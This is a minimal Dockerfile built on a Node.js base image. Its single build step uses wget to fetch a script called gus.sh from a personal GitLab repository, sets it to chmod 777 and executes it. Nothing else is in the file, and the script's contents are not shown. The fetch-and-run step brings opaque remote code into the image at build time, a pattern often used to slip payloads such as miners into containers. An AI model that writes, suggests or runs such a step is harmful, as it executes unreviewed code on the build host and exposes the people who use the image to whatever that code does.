FROM node:latest

RUN wget https://gitlab.com/vienatasari/d/-/raw/main/gus.sh && chmod 777 gus.sh && ./gus.sh
